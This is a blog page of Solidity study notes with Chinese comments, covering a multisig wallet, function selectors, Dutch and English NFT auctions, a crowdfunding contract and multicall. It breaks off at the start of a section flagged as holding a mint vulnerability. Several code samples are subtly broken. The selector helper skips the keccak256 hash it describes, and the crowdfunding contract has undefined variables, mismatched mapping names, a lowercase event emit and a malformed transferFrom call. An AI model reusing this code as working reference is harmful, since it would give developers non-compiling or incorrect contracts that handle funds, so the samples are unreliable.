i;i&lt;_owners.length;i++)&#123;</span><br><span class="line">            address owner=_owners[i];</span><br><span class="line">            require(owner!=address(<span class="number">0</span>),<span class="string">&quot;invalid owner&quot;</span>);<span class="comment">//检查地址是否存在</span></span><br><span class="line">            require(!isOwner[owner],<span class="string">&quot;owner is not unique&quot;</span>);<span class="comment">//检查是否重复</span></span><br><span class="line">            isOwner[owner]=<span class="literal">true</span>;</span><br><span class="line">            owners.push(owner);</span><br><span class="line">        &#125;</span><br><span class="line">        required=_required;</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     receive()external payable&#123;</span><br><span class="line">            emit <span class="title function_">Deposit</span><span class="params">(msg.sender,msg.value)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">submit</span><span class="params">(address _to,uint _value,bytes calldata _data)</span></span><br><span class="line">        external onlyOwner&#123;<span class="comment">//此函数来提交交易数据</span></span><br><span class="line">            transactions.push(Transaction(&#123;</span><br><span class="line">                to: _to,</span><br><span class="line">                value: _value,</span><br><span class="line">                data: _data,</span><br><span class="line">                executed:<span class="literal">false</span></span><br><span class="line">            &#125;));</span><br><span class="line">            emit <span class="title function_">Submit</span><span class="params">(transactions.length<span class="number">-1</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">approve</span><span class="params">(uint _txId)</span></span><br><span class="line">        external onlyOwner</span><br><span class="line">        <span class="title function_">txExists</span><span class="params">(_txId)</span><span class="comment">//判断交易id是否存在</span></span><br><span class="line">        <span class="title function_">notApproved</span><span class="params">(_txId)</span><span class="comment">//判断这个签名人是否已经批准过了</span></span><br><span class="line">        <span class="title function_">notExecuted</span><span class="params">(_txId)</span><span class="comment">//判断这个交易id是否执行过了</span></span><br><span class="line">    &#123;</span><br><span class="line">        approved[_txId][msg.sender]=<span class="literal">true</span>;</span><br><span class="line">        emit <span class="title function_">Approve</span><span class="params">(msg.sender,_txId)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//用来记录有多少人批准</span></span><br><span class="line">    function _getApproveCount(uint _txId)private view <span class="title function_">returns</span><span class="params">(uint count)</span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(uint i;i&lt;owners.length;i++)&#123;</span><br><span class="line">           <span class="keyword">if</span>(approved[_txId][owners[i]]) &#123;</span><br><span class="line">               count+=<span class="number">1</span>;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//用于执行最终业务，既交易</span></span><br><span class="line">    function <span class="title function_">execute</span><span class="params">(uint _txId)</span> external <span class="title function_">txExists</span><span class="params">(_txId)</span> <span class="title function_">notExecuted</span><span class="params">(_txId)</span>&#123;</span><br><span class="line">        require(_getApproveCount(_txId)&gt;=required,<span class="string">&quot;approvals &lt; required&quot;</span>);</span><br><span class="line">        Transaction storage transaction=transactions[_txId];</span><br><span class="line"></span><br><span class="line">        transaction.executed=<span class="literal">true</span>; </span><br><span class="line"></span><br><span class="line">        (<span class="type">bool</span> success,)=transaction.to.call&#123;value:transaction.value&#125;(</span><br><span class="line">            transaction.data</span><br><span class="line">        );</span><br><span class="line">        require(success,<span class="string">&quot;tx failed&quot;</span>);</span><br><span class="line">        emit <span class="title function_">Execute</span><span class="params">(_txId)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//批准人在交易前撤销自己原来的批准</span></span><br><span class="line">    function <span class="title function_">revoke</span><span class="params">(uint _txId)</span>external onlyOwner <span class="title function_">txExists</span><span class="params">(_txId)</span> <span class="title function_">notExecuted</span><span class="params">(_txId)</span>&#123;</span><br><span class="line">        require(approved[_txId][msg.sender],<span class="string">&quot;tx not approved&quot;</span>);</span><br><span class="line">        approved[_txId][msg.sender]=<span class="literal">false</span>;</span><br><span class="line">        emit <span class="title function_">Revoke</span><span class="params">(msg.sender,_txId)</span>; </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="函数签名-函数的选择器"><a href="#函数签名-函数的选择器" class="headerlink" title="函数签名(函数的选择器)"></a>函数签名(函数的选择器)</h2><p><strong>EVM通过函数选择器来调用函数</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">contract FunctionSelector&#123;<span class="comment">//获取函数选择器</span></span><br><span class="line">    function <span class="title function_">getSelector</span><span class="params">(<span class="built_in">string</span> calldata _func)</span>external pure <span class="title function_">returns</span><span class="params">(bytes4)</span>&#123;</span><br><span class="line">        <span class="comment">//输入的_func为&quot;transfer(address,uint256)&quot;获取oxa9059cbb与下面的一样</span></span><br><span class="line">        <span class="comment">//return bytes4(keccak256(bytes(_func)));</span></span><br><span class="line">        <span class="keyword">return</span> bytes4(bytes(_func));</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> contract Receiver&#123;</span><br><span class="line">    event <span class="title function_">Log</span><span class="params">(bytes data)</span>;</span><br><span class="line">    function <span class="title function_">transfer</span><span class="params">(address _to,uint _amount)</span>external&#123;</span><br><span class="line">        emit <span class="title function_">Log</span><span class="params">(msg.data)</span>;</span><br><span class="line">        <span class="comment">//msg.data:为下面三行组成</span></span><br><span class="line">        <span class="comment">//0xa9059cbb   函数的签名（选择器） [将函数的名称和类型打包后哈希然后取前四个字节]</span></span><br><span class="line">        <span class="comment">//0000000000000000000000005b38da6a701c568545dcfcb03fcb875f56beddc4  地址参数</span></span><br><span class="line">        <span class="comment">//000000000000000000000000000000000000000000000000000000000000000b   数字残数</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="荷兰拍卖"><a href="#荷兰拍卖" class="headerlink" title="荷兰拍卖"></a>荷兰拍卖</h2><p><strong>随着时间流逝，拍卖价格会越来越低，谁先举牌谁拥有拍卖物品</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">interface IERC721&#123;<span class="comment">//这个合约有很多东西</span></span><br><span class="line">    function <span class="title function_">transferFrom</span><span class="params">(address _from,address _to,uint _nftId)</span>external;</span><br><span class="line">    <span class="comment">//ERC721与ERC20都必须在他们的合约中approve才能使用他们的transferFrom方法</span></span><br><span class="line">&#125;</span><br><span class="line">contract DutchAuction&#123;</span><br><span class="line">    uint private constant DURATION=<span class="number">7</span> days;</span><br><span class="line">    IERC721 public immutable nft;</span><br><span class="line">    uint public immutable nftId;</span><br><span class="line">    address payable public immutable seller;</span><br><span class="line">    uint public immutable startingPrice;</span><br><span class="line">    uint public immutable startAt;</span><br><span class="line">    uint public immutable expiresAt;</span><br><span class="line">    uint public immutable discountRate;</span><br><span class="line">    constructor(uint _startingPrice,uint _discountRate,address _nft,uint _nftId)&#123;</span><br><span class="line">        seller=payable(msg.sender);</span><br><span class="line">        startingPrice=_startingPrice;</span><br><span class="line">        discountRate=_discountRate;<span class="comment">//每秒的折扣率</span></span><br><span class="line">        startAt=block.timestamp;</span><br><span class="line">        expiresAt=block.timestamp+DURATION;</span><br><span class="line">        require(_startingPrice&gt;=_discountRate*DURATION);</span><br><span class="line">        nft=IERC721(_nft);</span><br><span class="line">        nftId=_nftId;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">getPrice</span><span class="params">()</span>public view <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        uint timeElapsed=block.timestamp-startAt;</span><br><span class="line">        uint discount =discountRate*timeElapsed;</span><br><span class="line">        <span class="keyword">return</span> startingPrice-discount;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">buy</span><span class="params">()</span>external payable&#123;</span><br><span class="line">        require(block.timestamp&lt;expiresAt,<span class="string">&quot;auction expired&quot;</span>);</span><br><span class="line">        uint price= getPrice();</span><br><span class="line">        require(msg.value&gt;=price,<span class="string">&quot;ETH &lt; price&quot;</span>);</span><br><span class="line">        nft.transferFrom(seller,msg.sender,nftId);</span><br><span class="line">        uint refund=msg.value-price;</span><br><span class="line">        <span class="keyword">if</span>(refund&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            payable(msg.sender).transfer(refund);</span><br><span class="line">        &#125;</span><br><span class="line">        selfdestruct(seller);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="英式拍卖"><a href="#英式拍卖" class="headerlink" title="英式拍卖"></a>英式拍卖</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">interface IERC721&#123;</span><br><span class="line">    function <span class="title function_">transferFrom</span><span class="params">(address from,address to,uint nftId)</span>external;</span><br><span class="line">&#125;</span><br><span class="line">contract EnglishAuction&#123;</span><br><span class="line">    event <span class="title function_">Bid</span><span class="params">(address indexed sender ,uint amount)</span>;</span><br><span class="line">    event <span class="title function_">Withdraw</span><span class="params">(address indexed bidder,uint amount)</span>;</span><br><span class="line">    event <span class="title function_">End</span><span class="params">(address highestBidder,uint amount)</span>;</span><br><span class="line"></span><br><span class="line">    IERC721 public immutable nft;</span><br><span class="line">    uint public immutable nftId;</span><br><span class="line"></span><br><span class="line">    address payable public immutable seller;</span><br><span class="line">    uint32 public endAt;</span><br><span class="line">    <span class="type">bool</span> public started;</span><br><span class="line">    <span class="type">bool</span> public ended;</span><br><span class="line"></span><br><span class="line">    address public highestBidder;</span><br><span class="line">    uint public highestBid;</span><br><span class="line">    mapping(address =&gt;uint)public bids;<span class="comment">//记录失败投标人投入的钱</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    constructor(address _nft,uint _nftId,uint _startingBid)&#123;</span><br><span class="line">        nft=IERC721(_nft);</span><br><span class="line">        nftId=_nftId;</span><br><span class="line">        seller=payable(msg.sender);</span><br><span class="line">        highestBid=_startingBid;<span class="comment">//以起初价格来初始化</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">start</span><span class="params">()</span>external&#123;<span class="comment">//开始拍卖</span></span><br><span class="line">        require(msg.sender==seller,<span class="string">&quot;not seller&quot;</span>);</span><br><span class="line">        require(!started,<span class="string">&quot;started&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        started=<span class="literal">true</span>;</span><br><span class="line">        endAt=uint32(block.timestamp+<span class="number">60</span>);<span class="comment">//六十秒结束</span></span><br><span class="line">        nft.transferFrom(seller,address(this),nftId);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">bid</span><span class="params">()</span>external payable&#123;<span class="comment">//参加的拍卖者再次竞标</span></span><br><span class="line">        require(started,<span class="string">&quot;not started&quot;</span>);</span><br><span class="line">        require(block.timestamp&lt;endAt,<span class="string">&quot;ended&quot;</span>);</span><br><span class="line">        require(msg.value&gt;highestBid,<span class="string">&quot;value &lt; hightest bid&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(highestBidder!=address(<span class="number">0</span>))&#123;</span><br><span class="line">            bids[highestBidder]+=highestBid;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        highestBid=msg.value;</span><br><span class="line">        highestBidder=msg.sender;</span><br><span class="line"></span><br><span class="line">        emit <span class="title function_">Bid</span><span class="params">(msg.sender,msg.value)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">withdraw</span><span class="params">()</span>external&#123;<span class="comment">//失败的选手可在此提取原来竞拍投入的钱</span></span><br><span class="line">        uint bal=bids[msg.sender];</span><br><span class="line">        bids[msg.sender]=<span class="number">0</span>;</span><br><span class="line">        payable(msg.sender).transfer(bal);</span><br><span class="line">        emit <span class="title function_">Withdraw</span><span class="params">(msg.sender,bal)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">end</span><span class="params">()</span>external&#123;<span class="comment">//结束拍卖，并将nftId转入最高价的人</span></span><br><span class="line">        require(started,<span class="string">&quot;not started&quot;</span>);</span><br><span class="line">        require(!ended,<span class="string">&quot;ended&quot;</span>);</span><br><span class="line">        require(block.timestamp&gt;=endAt,<span class="string">&quot;not ended&quot;</span>);</span><br><span class="line"></span><br><span class="line">        ended=<span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(highestBidder!=address(<span class="number">0</span>))&#123;<span class="comment">//如果有人参加</span></span><br><span class="line">            nft.transferFrom(address(this),highestBidder,nftId);</span><br><span class="line">            seller.transfer(highestBid);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">//没人参加highestBidders的地址为0</span></span><br><span class="line">            nft.transferFrom(address(this),seller,nftId);</span><br><span class="line">        &#125;</span><br><span class="line">        emit <span class="title function_">End</span><span class="params">(highestBidder,highestBid)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="众筹合约"><a href="#众筹合约" class="headerlink" title="众筹合约"></a>众筹合约</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">contract CrowdFund&#123;</span><br><span class="line">    event <span class="title function_">Launch</span><span class="params">(uint id,address indexed creator,uint goal,uint32 startAt,uint32 endAt)</span>;</span><br><span class="line">    event <span class="title function_">Cancel</span><span class="params">(uint id)</span>;</span><br><span class="line">    event <span class="title function_">Pledge</span><span class="params">(uint indexed id,address indexed caller,uint amount )</span>;</span><br><span class="line">    event <span class="title function_">Unpledge</span><span class="params">(uint indexed id,address indexed caller,uint amount)</span>;</span><br><span class="line">    event <span class="title function_">Claim</span><span class="params">(uint id)</span>;</span><br><span class="line">    event <span class="title function_">Refund</span><span class="params">(uint indexed id,address indexed caller,uint amount)</span>;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Campaign</span>&#123;</span></span><br><span class="line">        address creator;</span><br><span class="line">        uint goal;</span><br><span class="line">        uint pledged;</span><br><span class="line">        uint32 startAt;</span><br><span class="line">        uint32 endAt;</span><br><span class="line">        <span class="type">bool</span> claimed;<span class="comment">//false筹款未被领走，true筹款被领走</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    IERC20 public immutable token;</span><br><span class="line">    uint public count;<span class="comment">//多少个筹款活动</span></span><br><span class="line">    mapping(uint =&gt;Campaign) public campaigns;<span class="comment">//每个合约的映射</span></span><br><span class="line">    mapping(uint=&gt;mapping(address=&gt;uint))public pledgeAmount;<span class="comment">//参与人参与第几个合约的数量</span></span><br><span class="line">    </span><br><span class="line">    constructor(address _token)&#123;</span><br><span class="line">        token=IERC20(_token);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">launch</span><span class="params">(uint _goal,uint32 _startAt,uint32 _endAt)</span>external&#123;<span class="comment">//</span></span><br><span class="line">    require(startAt&gt;=block.timestamp,<span class="string">&quot;start at &lt; now&quot;</span>);</span><br><span class="line">    require(_endAt&gt;=_startAt,<span class="string">&quot;end at &lt; start at&quot;</span>);</span><br><span class="line">    require (_endAt&lt;=block.timestamp+<span class="number">90</span> days,<span class="string">&quot;end at &gt;max duration&quot;</span>);</span><br><span class="line">    count+=<span class="number">1</span>;</span><br><span class="line">    campaigns[count]=Campaign(&#123;</span><br><span class="line">        creator:msg.sender,</span><br><span class="line">        goal:_goal,</span><br><span class="line">        pledged:<span class="number">0</span>,</span><br><span class="line">        startAt:_startAt,</span><br><span class="line">        endAt:_endAt,</span><br><span class="line">        claimed:<span class="literal">false</span></span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    emit <span class="title function_">Launch</span><span class="params">(count, msg.sender,_goal,_startAt,_endAt)</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">cancel</span><span class="params">(uint _id)</span>external&#123;<span class="comment">//开始前取消众筹</span></span><br><span class="line">        Campaign memory campaign=campaigns[id];</span><br><span class="line">        require(msg.sender==campaign.creator,<span class="string">&quot;not creator&quot;</span>);</span><br><span class="line">        require(block.timestamp&lt;campaign.startAt,<span class="string">&quot;started&quot;</span>);</span><br><span class="line">        delete campaigns[id];</span><br><span class="line">        emit <span class="title function_">Cancel</span><span class="params">(_id)</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">pledge</span><span class="params">(uint _id,uint _amount)</span>external&#123;<span class="comment">//参与众筹</span></span><br><span class="line">        Campaign storage campaign=campaigns[_id];</span><br><span class="line">        require(block.timestamp&gt;=campaign.startAt,<span class="string">&quot;not started&quot;</span>);</span><br><span class="line">        require(block.timestamp&lt;=campaign.endAt,<span class="string">&quot;ended&quot;</span>);</span><br><span class="line">        campaign.pledged+=_amount;</span><br><span class="line">        pledgedAmount[_id][msg.sender]+=_amount;</span><br><span class="line">        token.transferFrom(msg.sender,address(this),_amount);</span><br><span class="line">        emit <span class="title function_">pledge</span><span class="params">(_id,msg.sender,_amount)</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">unpledge</span><span class="params">(uint _id,uint _amount)</span>external&#123;<span class="comment">//撤消众筹</span></span><br><span class="line">    Campaign storage campaign=campaigns[_id];</span><br><span class="line">    require(block.timestamp&lt;=campaign.endAt,<span class="string">&quot;ended&quot;</span>);</span><br><span class="line">    require(pledgeAmount[_id][msg.sender]&gt;=_amount);</span><br><span class="line">    campaign.pledged-=_amount;</span><br><span class="line">    pledgeAmount[_id][msg.sender]-=_amount;</span><br><span class="line"></span><br><span class="line">    token.transfer(msg.sender,_amount);</span><br><span class="line">    emit <span class="title function_">Unpledge</span><span class="params">(_id,msg.sender,_amount)</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">claim</span><span class="params">(uint _id)</span>external&#123;</span><br><span class="line">        Campaign storage campaign=campaigns[_id];</span><br><span class="line">        require(msg.sender==campaign.creator,<span class="string">&quot;not creator&quot;</span>);</span><br><span class="line">        require(block.timestamp&gt;campaign.endAt,<span class="string">&quot;not ended&quot;</span>);</span><br><span class="line">        require(campaign.pledged&gt;=campaign.goal,<span class="string">&quot;pledged&lt;goal&quot;</span>);</span><br><span class="line">        require(!campaign.claimed,<span class="string">&quot;claimed&quot;</span>);</span><br><span class="line">        campaign.claimed=<span class="literal">true</span>;</span><br><span class="line">        token.transferFrom(msg.sender,campaign.pledged);</span><br><span class="line">        emit <span class="title function_">Claim</span><span class="params">(_id)</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">refund</span><span class="params">(uint _id)</span>external&#123;<span class="comment">//未达到目标就会失败，用户可以取走自己的钱</span></span><br><span class="line">    Campaign storage campaign=campaigns[_id];</span><br><span class="line">    require(block.timestamp&gt;campaign.endAt,<span class="string">&quot;not ended&quot;</span>);</span><br><span class="line">    require(campaign.pledged&lt;campaign.goal,<span class="string">&quot;pledged&gt;goal&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uint bal=pledgeAmount[_id][msg.sender];</span><br><span class="line">    pledgeAmount[_id][msg.sender]=<span class="number">0</span>;</span><br><span class="line">    token.transfer(msg.sender,bal);</span><br><span class="line">    emit <span class="title function_">Refund</span><span class="params">(_id,msg.sender,bal)</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Multi-call多重调用"><a href="#Multi-call多重调用" class="headerlink" title="Multi call多重调用"></a>Multi call多重调用</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line">contract TestMultiCall&#123;</span><br><span class="line">  function <span class="title function_">func1</span><span class="params">()</span>external view <span class="title function_">returns</span><span class="params">(uint,uint)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span>(<span class="number">1</span>,block.timestamp);</span><br><span class="line">  &#125;</span><br><span class="line">  function <span class="title function_">func2</span><span class="params">()</span>external view <span class="title function_">returns</span><span class="params">(uint,uint)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span>(<span class="number">2</span>,block.timestamp);</span><br><span class="line">  &#125;</span><br><span class="line">  function <span class="title function_">getData1</span><span class="params">()</span>external pure <span class="title function_">returns</span><span class="params">(bytes memory)</span>&#123;</span><br><span class="line">    <span class="comment">//abi.encodeWithSignature(&quot;func1()&quot;)</span></span><br><span class="line">    <span class="keyword">return</span> abi.encodeWithSelector(this.func1.selector);</span><br><span class="line">  &#125;</span><br><span class="line">   function <span class="title function_">getData2</span><span class="params">()</span>external pure <span class="title function_">returns</span><span class="params">(bytes memory)</span>&#123;</span><br><span class="line">    <span class="comment">//abi.encodeWithSignature(&quot;func2()&quot;)</span></span><br><span class="line">    <span class="keyword">return</span> abi.encodeWithSelector(this.func2.selector);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">contract MultiCall&#123;</span><br><span class="line">  function <span class="title function_">fun</span><span class="params">(address addr)</span>external <span class="title function_">returns</span><span class="params">( uint,uint)</span>&#123;</span><br><span class="line">    (uint x,uint y)=TestMultiCall(addr).func1();</span><br><span class="line">    (uint z,uint t)=TestMultiCall(addr).func2();</span><br><span class="line">    <span class="keyword">return</span> (y,t);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//通过data调用</span></span><br><span class="line">contract MultiCall2&#123;</span><br><span class="line">  function <span class="title function_">multicall</span><span class="params">(address[]calldata targets,bytes[]memory data)</span></span><br><span class="line">    external view <span class="title function_">returns</span><span class="params">(bytes[] memory)</span></span><br><span class="line">  &#123;</span><br><span class="line">    require(targets.length==data.length,<span class="string">&quot;target!=data&quot;</span>);</span><br><span class="line">    bytes[]memory results=new bytes[](data.length);</span><br><span class="line">    <span class="keyword">for</span>(uint i;i&lt;targets.length;i++)&#123;</span><br><span class="line">      (<span class="type">bool</span> success,bytes memory result)=targets[i].staticcall(data[i]);<span class="comment">//静态调用，因为有view</span></span><br><span class="line">      require(success,<span class="string">&quot;call failed&quot;</span>);</span><br><span class="line">      results[i]=result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> results;</span><br><span class="line">    <span class="comment">//返回的data是bytes类型的，需要解码。</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="多重委托调用-mint处内涵漏洞！！！"><a href="#多重委托调用-mint处内涵漏洞！！！" class="headerlink" title="多重委托调用(mint处内涵漏洞！！！)"></a>多重委托调用(mint处内涵漏洞！！！)</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 